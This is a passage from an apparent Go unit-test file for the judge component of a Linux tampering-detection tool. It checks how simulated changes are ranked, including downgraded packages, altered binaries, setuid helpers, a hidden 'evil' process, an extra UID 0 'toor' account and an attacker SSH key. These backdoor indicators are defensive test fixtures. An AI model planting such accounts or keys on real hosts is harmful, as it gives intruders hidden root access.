package judge

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/donaldsteele/telltale/internal/checklist"
	"github.com/donaldsteele/telltale/internal/collect"
	"github.com/donaldsteele/telltale/internal/model"
	"github.com/donaldsteele/telltale/internal/pkgverify"
)

var (
	now     = time.Date(2026, 11, 22, 14, 5, 0, 0, time.UTC)
	taken   = time.Date(2026, 11, 2, 9, 30, 0, 0, time.UTC)
	changed = time.Date(2026, 11, 21, 3, 12, 0, 0, time.UTC)
)

const (
	serverKey = `from="192.0.2.10" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIServerKeyBlob telltale-server`
	ownerKey  = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOwnerKeyBlob owner@laptop"
	evilKey   = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyBlobXX mallory"
)

var ctx = model.ScanContext{DigestKey: []byte("test-digest-key"), ServerAddr: "192.0.2.10", ServerKeyLine: serverKey}

func h(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

func file(p, content string, perm uint32) model.FileEntry {
	return model.FileEntry{Path: p, Type: "file", SHA256: h(content), Mode: 0o100000 | perm, Size: int64(len(content)), MTime: taken, CTime: taken}
}

func pkg(name, version string, files ...string) model.Package {
	return model.Package{Name: name, Version: version, Arch: "amd64", Status: "install ok installed", Files: files}
}

// clean is a machine on which every checklist item that can be judged
// passes and no heuristic fires.
func clean() *model.Collection {
	yes := true
	return &model.Collection{
		Schema: model.CollectionSchema,
		Host:   model.Host{Hostname: "web01", OSID: "debian", OSVersionID: "12", OSPretty: "Debian GNU/Linux 12 (bookworm)", Arch: "amd64", Kernel: "6.1.0-25-amd64"},
		Time:   now,
		AsRoot: true,
		Files: []model.FileEntry{
			file("/usr/bin/openssl", "openssl 3.0.14", 0o755),
			file("/usr/bin/ls", "ls 9.1", 0o755),
			file("/usr/share/doc/openssl/README", "readme", 0o644),
			file("/etc/hostname", "web01", 0o644),
		},
		Accounts: model.Accounts{
			Users: []model.User{{Name: "root", UID: 0, GID: 0, Home: "/root", Shell: "/bin/bash",
				Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "digest-root-1", LastChange: 20000}}},
			Groups: []model.Group{{Name: "root", GID: 0}, {Name: "sudo", GID: 27}, {Name: "staff", GID: 50}, {Name: "users", GID: 100}},
		},
		Packages: model.Packages{Installed: []model.Package{
			pkg("openssl", "3.0.14-1~deb12u2", "/usr/bin/openssl", "/usr/share/doc/openssl/README"),
			pkg("coreutils", "9.1-1", "/usr/bin/ls"),
			pkg("auditd", "1:3.0.9-1"),
			pkg("unattended-upgrades", "2.9.1+nmu3"),
			pkg("ufw", "0.36.2-1"),
		}},
		Firewall: model.Firewall{Backend: "nftables", InputPolicy: "drop", InputRules: 3, UFWEnabled: &yes},
		Sysctl:   map[string]string{"kernel.randomize_va_space": "2", "apparmor.enabled": "Y"},
	}
}

func clone(c *model.Collection) *model.Collection {
	b, err := json.Marshal(c)
	if err != nil {
		panic(err)
	}
	var out model.Collection
	if err := json.Unmarshal(b, &out); err != nil {
		panic(err)
	}
	return &out
}

func snapOf(c *model.Collection) *model.Snapshot {
	return &model.Snapshot{Schema: model.SnapshotSchema, Taken: taken, Collection: clone(c), Checks: checklist.Evaluate(c, ctx), DigestKey: ctx.DigestKey}
}

func archive(verified ...pkgverify.FileVerdict) *pkgverify.Result {
	return &pkgverify.Result{Mode: pkgverify.ModeArchive, Verified: verified, SourcesUsed: []string{"https://deb.debian.org/debian bookworm"}}
}

func run(c *model.Collection, s *model.Snapshot, r *pkgverify.Result) *model.Report {
	return Judge(Input{Collection: c, Snapshot: s, Context: ctx, Pkg: r, Now: now})
}

func find(r *model.Report, key string) *model.Finding {
	for i := range r.Findings {
		if r.Findings[i].Key == key {
			return &r.Findings[i]
		}
	}
	return nil
}

func explained(r *model.Report, key string) *model.Finding {
	for i := range r.Explained {
		if r.Explained[i].Key == key {
			return &r.Explained[i]
		}
	}
	return nil
}

func keys(r *model.Report) []string {
	var out []string
	for _, f := range r.Findings {
		out = append(out, f.Key)
	}
	return out
}

func must(t *testing.T, r *model.Report, key string, sev model.Severity) *model.Finding {
	t.Helper()
	f := find(r, key)
	if f == nil {
		t.Fatalf("no finding %q; have %v", key, keys(r))
	}
	if f.Severity != sev {
		t.Fatalf("%s: severity %v, want %v", key, f.Severity, sev)
	}
	return f
}

func absent(t *testing.T, r *model.Report, key string) {
	t.Helper()
	if f := find(r, key); f != nil {
		t.Fatalf("unexpected finding %q (%v): %s", key, f.Severity, f.Title)
	}
}

func hasEvidencePath(f *model.Finding, p string) bool {
	return slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Path == p })
}

func setFile(c *model.Collection, e model.FileEntry) {
	for i := range c.Files {
		if c.Files[i].Path == e.Path {
			c.Files[i] = e
			return
		}
	}
	c.Files = append(c.Files, e)
}

func setVersion(c *model.Collection, name, version string) {
	for i := range c.Packages.Installed {
		if c.Packages.Installed[i].Name == name {
			c.Packages.Installed[i].Version = version
			return
		}
	}
	panic("no package " + name)
}

func removePkg(c *model.Collection, name string) {
	c.Packages.Installed = slices.DeleteFunc(c.Packages.Installed, func(p model.Package) bool { return p.Name == name })
}

const evidenceCopy = "mkdir -p /root/telltale-evidence && cp -a --parents "

// --- the brief's tests ---

func TestJudgeRegressionIsTampering(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Sysctl["kernel.randomize_va_space"] = "0"

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "check:TT-KERN-001", model.SevTampering)
	if f.Source != "checklist" {
		t.Errorf("source %q", f.Source)
	}
	if e := f.Evidence[0]; e.Before != "kernel.randomize_va_space = 2" || e.After != "kernel.randomize_va_space = 0" {
		t.Errorf("evidence %+v", e)
	}
	if !strings.Contains(f.Fix, "sysctl -w kernel.randomize_va_space=2") {
		t.Errorf("fix %q", f.Fix)
	}
	if r.ExitCode != 2 {
		t.Errorf("exit %d", r.ExitCode)
	}

	// The same failure without a snapshot is only a weak setting.
	r = run(cur, nil, nil)
	must(t, r, "check:TT-KERN-001", model.SevWeak)
	if r.ExitCode != 1 {
		t.Errorf("exit %d", r.ExitCode)
	}
}

func TestJudgeUpgradeExplained(t *testing.T) {
	old := clean()
	cur := clone(old)
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	nf := file("/usr/bin/openssl", "openssl 3.0.15", 0o755)
	nf.CTime = changed
	setFile(cur, nf)
	v := pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: nf.SHA256, Actual: nf.SHA256, Source: "archive"}

	r := run(cur, snapOf(old), archive(v))
	if len(r.Findings) != 0 {
		t.Fatalf("findings %v", keys(r))
	}
	if r.ExitCode != 0 {
		t.Errorf("exit %d", r.ExitCode)
	}
	e := explained(r, "explained:openssl")
	if e == nil {
		t.Fatalf("no explained group; explained %+v", r.Explained)
	}
	if e.Severity != model.SevExplained || !hasEvidencePath(e, "/usr/bin/openssl") {
		t.Errorf("group %+v", e)
	}
	if e.Evidence[0].Before != "3.0.14-1~deb12u2" || e.Evidence[0].After != "3.0.15-1~deb12u1" {
		t.Errorf("version evidence %+v", e.Evidence[0])
	}
	if want := "openssl upgraded from 3.0.14-1~deb12u2 to 3.0.15-1~deb12u1; 1 file changed with it"; e.Title != want || e.Why == "" {
		t.Errorf("group title %q, want %q (why %q)", e.Title, want, e.Why)
	}

	// Without verification the same changed program is not explained, and
	// neither is the upgrade: nothing confirmed its files.
	r = run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/usr/bin/openssl", model.SevBackdoor)
	must(t, r, "snap.pkg_upgraded:openssl", model.SevNote)
	if explained(r, "explained:openssl") != nil {
		t.Errorf("unconfirmed upgrade explained")
	}
}

func TestJudgeKernelPackageExplained(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed,
		pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"), pkg("linux-headers-6.1.0-25-amd64", "6.1.106-3"))

	cur := clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed,
		pkg("linux-image-6.1.0-27-amd64", "6.1.115-1"), pkg("linux-headers-6.1.0-27-amd64", "6.1.115-1"))
	newKernel := cur
	r := run(cur, snapOf(old), nil)
	for _, n := range []string{"linux-image-6.1.0-27-amd64", "linux-headers-6.1.0-27-amd64"} {
		absent(t, r, "snap.pkg_installed:"+n)
		if explained(r, "explained:"+n) == nil {
			t.Errorf("%s not explained", n)
		}
	}

	// Another flavour, or an older version, is not routine.
	cur = clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed,
		pkg("linux-image-6.1.0-27-rt-amd64", "6.1.115-1"), pkg("linux-image-6.1.0-20-amd64", "6.1.85-1"))
	r = run(cur, snapOf(old), nil)
	must(t, r, "snap.pkg_installed:linux-image-6.1.0-27-rt-amd64", model.SevNote)
	must(t, r, "snap.pkg_installed:linux-image-6.1.0-20-amd64", model.SevNote)

	// Removing the old kernel once a newer one is installed is routine too;
	// removing the only kernel of a flavour is not.
	cur2 := clone(newKernel)
	removePkg(cur2, "linux-image-6.1.0-25-amd64")
	r = run(cur2, snapOf(newKernel), nil)
	absent(t, r, "snap.pkg_removed:linux-image-6.1.0-25-amd64")
	if explained(r, "explained:linux-image-6.1.0-25-amd64") == nil {
		t.Errorf("old kernel removal not explained")
	}
	cur3 := clone(old)
	removePkg(cur3, "linux-image-6.1.0-25-amd64")
	must(t, run(cur3, snapOf(old), nil), "snap.pkg_removed:linux-image-6.1.0-25-amd64", model.SevNote)
}

func TestJudgeNewPackageWithSetuidIsBackdoor(t *testing.T) {
	old := clean()
	cur := clone(old)
	helper := file("/usr/bin/helper", "helper", 0o4755)
	jq := file("/usr/bin/jq", "jq", 0o755)
	cur.Files = append(cur.Files, helper, jq)
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("helperpkg", "1.0-1", "/usr/bin/helper"), pkg("jq", "1.6-2.1", "/usr/bin/jq"))
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/helper", Package: "helperpkg", Version: "1.0-1", Expected: helper.SHA256, Actual: helper.SHA256, Source: "archive"},
		pkgverify.FileVerdict{Path: "/usr/bin/jq", Package: "jq", Version: "1.6-2.1", Expected: jq.SHA256, Actual: jq.SHA256, Source: "archive"})

	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_installed:helperpkg", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/bin/helper") {
		t.Errorf("evidence does not name the setuid program: %+v", f.Evidence)
	}
	if !strings.Contains(f.Fix, "apt-get purge -- 'helperpkg'") || !strings.HasPrefix(f.Fix, "mkdir -p /root/telltale-evidence && ") {
		t.Errorf("fix %q", f.Fix)
	}
	n := must(t, r, "snap.pkg_installed:jq", model.SevNote)
	// The packages' own verified files are evidence on the package's
	// finding, not ranked again.
	absent(t, r, "snap.file_added:/usr/bin/helper")
	absent(t, r, "snap.file_added:/usr/bin/jq")
	if !hasEvidencePath(n, "/usr/bin/jq") || explained(r, "explained:jq") != nil {
		t.Errorf("verified file of a new package not on its finding: %+v", n.Evidence)
	}
}

func TestJudgeDowngradeIsBackdoor(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3"))
	cur := clone(old)
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u1")

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.pkg_downgraded:openssh-server", model.SevBackdoor)
	if !strings.Contains(f.Fix, "apt-get install -- 'openssh-server=1:9.2p1-2+deb12u3'") {
		t.Errorf("fix %q", f.Fix)
	}
	if f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || !strings.HasPrefix(f.Evidence[0].After, "1:9.2p1-2+deb12u1; files sha256:") {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
}

func TestJudgeMismatchIsTampering(t *testing.T) {
	c := clean()
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{
		{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: h("evil ls"), Reason: "differs from the file in the signed package", Source: "archive"},
		{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.14-1~deb12u2", Expected: h("openssl 3.0.14"), Actual: h("openssl 3.0.14"), Reason: "mode differs: deb 0755, disk 4755", Source: "snapshot", Kind: pkgverify.KindModeAddsPrivilege},
	}
	r := run(c, nil, res)
	f := must(t, r, "pkg.mismatch:/usr/bin/ls", model.SevTampering)
	if f.Source != "package" {
		t.Errorf("source %q", f.Source)
	}
	if e := f.Evidence[0]; e.Before != h("ls 9.1") || e.After != h("evil ls") || !strings.Contains(e.Detail, "archive") {
		t.Errorf("evidence %+v", e)
	}
	want := evidenceCopy + "'/usr/bin/ls' /root/telltale-evidence/ && apt-get install --reinstall -- 'coreutils'"
	if !strings.HasPrefix(f.Fix, want) {
		t.Errorf("fix %q, want prefix %q", f.Fix, want)
	}
	m := must(t, r, "pkg.mismatch:/usr/bin/openssl", model.SevTampering)
	if !strings.Contains(m.Title, "privileges its signed openssl package does not give it") {
		t.Errorf("mode mismatch title %q", m.Title)
	}
	if !strings.Contains(m.Evidence[0].Detail, "mode differs: deb 0755, disk 4755") {
		t.Errorf("mode evidence %+v", m.Evidence[0])
	}
	if r.ExitCode != 2 {
		t.Errorf("exit %d", r.ExitCode)
	}
}

func TestJudgeUnverifiableGrouped(t *testing.T) {
	c := clean()
	special := []model.FileEntry{
		file("/usr/bin/su", "su", 0o4755),
		file("/lib/modules/6.1.0-25-amd64/kernel/fs/x.ko", "ko", 0o644),
		file("/usr/lib/x86_64-linux-gnu/security/pam_x.so", "pam", 0o644),
		file("/boot/vmlinuz-6.1.0-25-amd64", "kernel", 0o644),
	}
	plain := []model.FileEntry{
		file("/usr/bin/a", "a", 0o755),
		file("/usr/bin/b", "b", 0o755),
		file("/usr/lib/x86_64-linux-gnu/libx.so.1", "lib", 0o644),
	}
	c.Files = append(append(c.Files, special...), plain...)
	notOfficial := pkgverify.ReasonNotOfficial + " or a snapshot of it"
	res := archive()
	for _, e := range special {
		res.Unverifiable = append(res.Unverifiable, pkgverify.FileVerdict{Path: e.Path, Package: "localpkg", Version: "1", Reason: notOfficial, Kind: pkgverify.KindNotFound})
	}
	res.Unverifiable = append(res.Unverifiable,
		pkgverify.FileVerdict{Path: "/usr/bin/a", Package: "localpkg", Reason: notOfficial},
		pkgverify.FileVerdict{Path: "/usr/bin/b", Package: "localpkg", Reason: notOfficial},
		pkgverify.FileVerdict{Path: "/usr/lib/x86_64-linux-gnu/libx.so.1", Package: "pro", Reason: pkgverify.ReasonPro})

	r := run(c, nil, res)
	g := must(t, r, "pkg.unverifiable", model.SevNote)
	if !strings.Contains(g.Title, "3") {
		t.Errorf("title %q does not count the 3 grouped files", g.Title)
	}
	var details []string
	for _, e := range g.Evidence {
		details = append(details, e.Detail)
	}
	all := strings.Join(details, "\n")
	if !strings.Contains(all, "2 files: "+notOfficial) || !strings.Contains(all, "1 file: "+pkgverify.ReasonPro) {
		t.Errorf("grouped evidence lacks reasons and counts:\n%s", all)
	}
	for _, e := range plain {
		absent(t, r, "pkg.unverifiable:"+e.Path)
	}
	for _, e := range special {
		must(t, r, "pkg.unverifiable:"+e.Path, model.SevBackdoor)
	}
}

func TestJudgeExceptionDropsMatchingValue(t *testing.T) {
	old := clean()
	old.Sysctl["kernel.randomize_va_space"] = "0"
	s := snapOf(old)
	s.Exceptions = []model.Exception{{FindingKey: "check:TT-KERN-001", AcceptedValue: "kernel.randomize_va_space = 0", Note: "lab box", At: taken}}

	r := run(clone(old), s, nil)
	absent(t, r, "check:TT-KERN-001")
	if len(r.Exceptions) != 1 || r.Exceptions[0].FindingKey != "check:TT-KERN-001" {
		t.Errorf("exceptions %+v", r.Exceptions)
	}
	if r.ExitCode != 0 {
		t.Errorf("exit %d (findings %v)", r.ExitCode, keys(r))
	}
}

func TestJudgeExceptionReappearsOnChange(t *testing.T) {
	old := clean()
	old.Sysctl["kernel.randomize_va_space"] = "1"
	s := snapOf(old)
	s.Exceptions = []model.Exception{{FindingKey: "check:TT-KERN-001", AcceptedValue: "kernel.randomize_va_space = 1", At: taken}}
	cur := clone(old)
	cur.Sysctl["kernel.randomize_va_space"] = "0"

	r := run(cur, s, nil)
	// The accepted value is the baseline: a different failing value is a
	// regression from it.
	f := must(t, r, "check:TT-KERN-001", model.SevTampering)
	if f.Evidence[0].Before != "kernel.randomize_va_space = 1" || f.Evidence[0].After != "kernel.randomize_va_space = 0" {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
	if len(r.Exceptions) != 0 {
		t.Errorf("exception listed as applied: %+v", r.Exceptions)
	}

	// Any finding: the accepted value matches -> dropped; it changed -> back.
	mis := func(actual string) *pkgverify.Result {
		res := archive()
		res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: actual, Reason: "differs from the file in the signed package", Source: "archive"}}
		return res
	}
	s2 := snapOf(clean())
	s2.Exceptions = []model.Exception{{FindingKey: "pkg.mismatch:/usr/bin/ls", AcceptedValue: h("local build"), At: taken}}
	r = run(clean(), s2, mis(h("local build")))
	absent(t, r, "pkg.mismatch:/usr/bin/ls")
	r = run(clean(), s2, mis(h("something else")))
	must(t, r, "pkg.mismatch:/usr/bin/ls", model.SevTampering)
}

func TestJudgeRankingOrder(t *testing.T) {
	older := time.Date(2026, 11, 1, 0, 0, 0, 0, time.UTC)
	newer := time.Date(2026, 11, 20, 0, 0, 0, 0, time.UTC)
	fs := []model.Finding{
		{Key: "z", Severity: model.SevNote, Source: "checklist"},
		{Key: "a", Severity: model.SevTampering, Source: "checklist"},
		{Key: "b", Severity: model.SevTampering, Source: "package"},
		{Key: "c", Severity: model.SevTampering, Source: "crossview"},
		{Key: "d", Severity: model.SevBackdoor, Source: "heuristic", Evidence: []model.Evidence{{When: &older}}},
		{Key: "e", Severity: model.SevBackdoor, Source: "heuristic", Evidence: []model.Evidence{{When: &older}, {When: &newer}}},
		{Key: "g", Severity: model.SevBackdoor, Source: "heuristic"},
		{Key: "f", Severity: model.SevBackdoor, Source: "heuristic"},
		{Key: "h", Severity: model.SevBackdoor, Source: "snapshot"},
		{Key: "i", Severity: model.SevWeak, Source: "heuristic"},
	}
	sortFindings(fs)
	var got []string
	for _, f := range fs {
		got = append(got, f.Key)
	}
	want := []string{"c", "b", "a", "h", "e", "d", "f", "g", "i", "z"}
	if !slices.Equal(got, want) {
		t.Errorf("order %v, want %v", got, want)
	}

	// End to end: a cross-view mismatch outranks a package mismatch, which
	// outranks regressed checklist items (the new system account also
	// breaks TT-ACCT-003); among notes the snapshot comes before heuristics.
	old := clean()
	cur := clone(old)
	cur.Sysctl["kernel.randomize_va_space"] = "0"
	cur.CrossView = []model.CrossViewResult{{Tool: "ps", Ran: true, HiddenFromTool: []string{"pid 4242 (evil)"}}}
	cur.Accounts.Users = append(cur.Accounts.Users, model.User{Name: "svc", UID: 998, GID: 998, Home: "/var/lib/svc", Shell: "/bin/sh",
		Password: model.PasswordState{Known: true, Locked: true, LastChange: 20000}})
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: h("evil"), Reason: "differs from the file in the signed package", Source: "archive"}}
	r := run(cur, snapOf(old), res)
	order := keys(r)
	wantOrder := []string{"heur.crossview:ps", "pkg.mismatch:/usr/bin/ls", "check:TT-ACCT-003", "check:TT-KERN-001", "snap.user_added:svc", "heur.system_shell:svc"}
	if !slices.Equal(order, wantOrder) {
		t.Fatalf("order %v, want %v", order, wantOrder)
	}
	if r.Findings[0].Source != "crossview" {
		t.Errorf("cross-view source %q", r.Findings[0].Source)
	}
	for i := 1; i < len(r.Findings); i++ {
		if r.Findings[i].Severity > r.Findings[i-1].Severity {
			t.Errorf("not ranked by severity: %v", order)
		}
	}
}

func TestJudgeExitCodes(t *testing.T) {
	r := run(clean(), nil, archive())
	if r.ExitCode != 0 || len(r.Findings) != 0 {
		t.Fatalf("clean machine: exit %d, findings %v", r.ExitCode, keys(r))
	}

	weak := clean()
	weak.Sysctl["kernel.randomize_va_space"] = "1"
	if r := run(weak, nil, nil); r.ExitCode != 1 {
		t.Errorf("weak setting: exit %d (%v)", r.ExitCode, keys(r))
	}

	note := clean()
	note.Accounts.Users = append(note.Accounts.Users, model.User{Name: "svc", UID: 998, GID: 998, Home: "/var/lib/svc", Shell: "/bin/sh",
		Password: model.PasswordState{Known: true, Locked: true, Algo: "!", LastChange: 20000}})
	if r := run(note, nil, nil); r.ExitCode != 1 || find(r, "heur.system_shell:svc") == nil {
		t.Errorf("note: exit %d (%v)", r.ExitCode, keys(r))
	}

	bad := clean()
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Expected: "a", Actual: "b", Reason: "differs from the file in the signed package", Source: "archive"}}
	if r := run(bad, nil, res); r.ExitCode != 2 {
		t.Errorf("tampering: exit %d", r.ExitCode)
	}
	back := clean()
	back.Accounts.Users = append(back.Accounts.Users, model.User{Name: "toor", UID: 0, Home: "/root", Shell: "/bin/bash",
		Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d", LastChange: 20000}})
	if r := run(back, nil, nil); r.ExitCode != 2 {
		t.Errorf("backdoor sign: exit %d", r.ExitCode)
	}
}

func TestJudgeAlwaysStatesKernelLimit(t *testing.T) {
	for name, r := range map[string]*model.Report{
		"nil collection": Judge(Input{Now: now}),
		"no snapshot":    run(clean(), nil, archive()),
		"snapshot":       run(clean(), snapOf(clean()), archive()),
	} {
		if !slices.Contains(r.CouldNotRuleOut, "kernel-level rootkits (any on-machine check can be fooled)") {
			t.Errorf("%s: could not rule out %q", name, r.CouldNotRuleOut)
		}
	}
}

func TestJudgeNoSnapshotComparedAgainstText(t *testing.T) {
	c := clean()
	judged := 0
	for _, res := range checklist.Evaluate(c, ctx) {
		if res.Skipped == "" {
			judged++
		}
	}
	items := "checklist (" + itoa(judged) + " items)"

	r := run(c, nil, archive())
	if want := []string{"Debian packages", items}; !slices.Equal(r.ComparedAgainst, want) {
		t.Errorf("compared against %q, want %q", r.ComparedAgainst, want)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no snapshot") }) {
		t.Errorf("no-snapshot limit not stated: %q", r.CouldNotRuleOut)
	}

	ub := clean()
	ub.Host.OSID = "ubuntu"
	if r := run(ub, nil, archive()); !slices.Contains(r.ComparedAgainst, "Ubuntu packages") {
		t.Errorf("ubuntu: %q", r.ComparedAgainst)
	}

	r = run(clean(), snapOf(clean()), archive())
	if len(r.ComparedAgainst) == 0 || r.ComparedAgainst[0] != "snapshot of 2026-11-02" {
		t.Errorf("with snapshot: %q", r.ComparedAgainst)
	}

	off := &pkgverify.Result{Mode: pkgverify.ModeOfflineLocal, Errors: []string{pkgverify.OfflineWarning},
		SourcesUsed: []string{"the machine's own package checksums (/var/lib/dpkg)"}}
	r = run(clean(), nil, off)
	if want := []string{"the machine's own package checksums (root can edit these)", items}; !slices.Equal(r.ComparedAgainst, want) {
		t.Errorf("offline: %q", r.ComparedAgainst)
	}
	for _, s := range r.Skipped {
		if s.Reason == pkgverify.OfflineWarning {
			t.Errorf("offline warning listed as a skipped check")
		}
	}

	refs := &pkgverify.Result{Mode: pkgverify.ModeRefs, SourcesUsed: []string{"reference bundle /mnt/refs"}}
	if r := run(clean(), nil, refs); !slices.Equal(r.ComparedAgainst, []string{"reference bundle", items}) {
		t.Errorf("refs: %q", r.ComparedAgainst)
	}

	// Verification ran but could reach no reference: nothing is claimed.
	unreachable := &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{"fetch https://deb.debian.org/debian/dists/bookworm/InRelease: no route to host"},
		Unverifiable: []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Reason: "no route to host", Kind: pkgverify.KindUnreachable}}}
	r = run(clean(), nil, unreachable)
	if !slices.Equal(r.ComparedAgainst, []string{items}) {
		t.Errorf("unreachable archive: %q", r.ComparedAgainst)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no package reference could be used") }) {
		t.Errorf("unreachable archive gap not stated: %q", r.CouldNotRuleOut)
	}

	// No package verification: no package reference is claimed, and the
	// gap is stated.
	r = run(clean(), nil, nil)
	if !slices.Equal(r.ComparedAgainst, []string{items}) {
		t.Errorf("no verification: %q", r.ComparedAgainst)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "package verification did not run") }) {
		t.Errorf("missing verification gap: %q", r.CouldNotRuleOut)
	}
}

func itoa(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

// --- package verification rulings ---

func TestJudgeSuspiciousIsBackdoor(t *testing.T) {
	res := archive()
	reason := "privilege granted by a local statoverride: deb 0755, disk 4755"
	res.Suspicious = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: h("ls 9.1"), Reason: reason, Source: "archive", Kind: pkgverify.KindStatOverride}}
	r := run(clean(), nil, res)
	f := must(t, r, "pkg.suspicious:/usr/bin/ls", model.SevBackdoor)
	if !strings.Contains(f.Why, reason) || !strings.Contains(f.Evidence[0].Detail, reason) {
		t.Errorf("reason missing: why %q evidence %+v", f.Why, f.Evidence[0])
	}
	if !strings.HasPrefix(f.Fix, evidenceCopy+"'/usr/bin/ls' /root/telltale-evidence/ && ") {
		t.Errorf("fix %q", f.Fix)
	}
	if !strings.Contains(f.Fix, "dpkg-statoverride --remove -- '/usr/bin/ls'") {
		t.Errorf("statoverride fix %q", f.Fix)
	}
}

func TestJudgeModeRelaxedIsNote(t *testing.T) {
	ls := clean().Files[1]
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/ls", Package: "coreutils", Expected: ls.SHA256, Actual: ls.SHA256, Reason: "mode differs (less permissive): deb 4755, disk 0755", Source: "archive", Kind: pkgverify.KindModeLessPermissive},
		pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Expected: "x", Actual: "x", Source: "archive"})
	r := run(clean(), nil, res)
	must(t, r, "pkg.mode_relaxed:/usr/bin/ls", model.SevNote)
	absent(t, r, "pkg.mode_relaxed:/usr/bin/openssl")
}

func TestJudgeConffilesExplainedQuietly(t *testing.T) {
	res := archive()
	res.Conffiles = []pkgverify.ConffileDiff{
		{Path: "/etc/ssh/sshd_config", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Expected: h("default"), Actual: h("edited"), Source: "archive"},
		{Path: "/etc/ssh/moduli", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Expected: h("m"), Actual: h("m2"), Source: "archive"},
	}
	r := run(clean(), nil, res)
	for _, f := range r.Findings {
		if hasEvidencePath(&f, "/etc/ssh/sshd_config") {
			t.Errorf("conffile ranked as finding %s", f.Key)
		}
	}
	g := explained(r, "pkg.conffiles:openssh-server")
	if g == nil || !hasEvidencePath(g, "/etc/ssh/sshd_config") || !hasEvidencePath(g, "/etc/ssh/moduli") {
		t.Fatalf("conffiles group %+v", g)
	}
	if r.ExitCode != 0 {
		t.Errorf("exit %d", r.ExitCode)
	}
}

func TestJudgeIndexSignatureErrors(t *testing.T) {
	bad := "BAD SIGNATURE: https://deb.debian.org/debian/dists/bookworm/InRelease: no valid signature (the index was tampered with or intercepted, or telltale's built-in keys are out of date; nothing that depends on it was verified)"
	other := "could not download 2 package(s); first error: timeout"
	res := archive()
	res.Errors = []string{bad, other}
	r := run(clean(), nil, res)
	f := must(t, r, "pkg.index_signature", model.SevNote)
	if f.Evidence[0].Detail != bad {
		t.Errorf("evidence %+v", f.Evidence)
	}
	if !slices.Contains(r.CouldNotRuleOut, bad) {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}
	if !slices.Contains(r.Skipped, model.Skip{Check: "packages", Reason: other}) {
		t.Errorf("skipped %+v", r.Skipped)
	}
	if slices.Contains(r.Skipped, model.Skip{Check: "packages", Reason: bad}) {
		t.Errorf("signature error hidden among skipped checks")
	}
}

func TestJudgeLowerTrustSourcesNote(t *testing.T) {
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/a", Package: "a", Source: "snapshot"},
		pkgverify.FileVerdict{Path: "/usr/bin/b", Package: "b", Source: "snapshot"},
		pkgverify.FileVerdict{Path: "/usr/bin/c", Package: "c", Source: "launchpad"},
		pkgverify.FileVerdict{Path: "/usr/bin/d", Package: "d", Source: "archive"})
	r := run(clean(), nil, res)
	f := must(t, r, "pkg.lower_trust", model.SevNote)
	if !strings.Contains(f.Title, "3") {
		t.Errorf("title %q", f.Title)
	}
	if r := run(clean(), nil, archive(pkgverify.FileVerdict{Path: "/usr/bin/d", Package: "d", Source: "archive"})); find(r, "pkg.lower_trust") != nil {
		t.Errorf("lower-trust note without lower-trust sources")
	}
}

// --- snapshot change rulings ---

func rootKeys(lines ...string) model.PersistFile {
	return model.PersistFile{Path: "/root/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys, Mode: 0o100600,
		SHA256: h(strings.Join(lines, "\n")), Lines: lines, MTime: changed}
}

func TestJudgeRootKeyNotesDroppedWithSnapshot(t *testing.T) {
	c := clean()
	c.Persist = []model.PersistFile{rootKeys(ownerKey)}
